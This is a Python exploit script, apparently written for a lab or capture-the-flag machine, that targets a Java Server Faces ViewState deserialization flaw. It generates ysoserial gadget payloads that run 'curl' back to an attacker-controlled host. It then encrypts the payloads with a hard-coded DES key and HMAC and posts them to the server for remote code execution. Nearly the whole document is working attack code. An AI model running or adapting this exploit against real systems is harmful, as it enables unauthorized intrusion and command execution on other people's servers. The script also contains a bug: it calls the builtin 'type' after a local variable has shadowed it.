#pip3 install pyDes
#pip install --upgrade setuptools, if we are having trouble for pip install pyDes for python2

from requests import post, get
from bs4 import BeautifulSoup
import sys
#from urllib import urlencode,quote_plus
from urllib.parse import urlencode,quote_plus #fix python3
import pyDes
import base64
import hmac
from hashlib import sha1
#import codecs
import urllib
import subprocess

url = 'http://10.129.1.35:8080/userSubscribe.faces'

def createPayload(type,cmd):
	ysoserial = f"java -jar ysoserial-master-SNAPSHOT.jar {type} 'cmd /c {cmd}' > {type}.bin"
	try:
		payload = subprocess.check_output(ysoserial, shell=True)
	except: #try to create the file , if error, we continue
	    pass


def getViewState(): # Finding if viewState exists or not
	try:
		request = get(url)
	except:
		print ("Can't connect to the server")
		sys.exit()
	soup = BeautifulSoup(request.text, 'html.parser')
	'''
	<input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=" /></form>
	'''
	viewState = soup.find('input', id='javax.faces.ViewState')['value']
	return viewState


def getPayload(type): #open payload.bin and read
	# Creating a payload for commons-collections 3.1 from https://github.com/frohoff/ysoserial
	payload = open(f'{type}.bin', 'rb').read()
	return payload.strip()


def exploit():
	viewState = getViewState()
	if viewState is None:
		print("(-)No viewState found")
	else:
		print("(+)viewState found")

	types = ["BeanShell1", "C3P0", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "FileUpload1", "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient", "JRMPListener", "JSON1", "JavassistWeld1", "Jdk7u21", "Jython1", "MozillaRhino1", "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Wicket1"]


	for x in types: #we meed tp test which ysoserial gadget can work
		cmd = f"curl http://10.10.14.16/{x}" #we need to create a sever at python3 -m http.server 80 for the call back
		createPayload(x,cmd) #creating a list of .bin file 


	for x in types: #for all the .bin file created we will try to read and send as payload
		payload = getPayload(x)
		#for python3 we straight away decode the base64 as bytes
		key= base64.b64decode('SnNGOTg3Ni0=')
		#setting the key which is in bytes and not string, as pyDes python3 takes in as string
		k = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
		enc = k.encrypt(payload) #encrypting the payload with DES
		hash_val = hmac.new(key, enc, sha1).digest()
		payload = enc + hash_val
		#for python3 we need to decode it back to utf-8 as string type
		payload_b64 = base64.b64encode(payload).decode('utf-8')
		print (f"(+)Sending encoded payload: {type(payload_b64)}")

		headers = {
		"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive","User-Agent": "Tomcat RCE","Content-Type": "application/x-www-form-urlencoded"}

		execute = {'javax.faces.ViewState': payload_b64}
		r = post(url, headers=headers, data=execute)


if __name__ == '__main__':
	exploit()


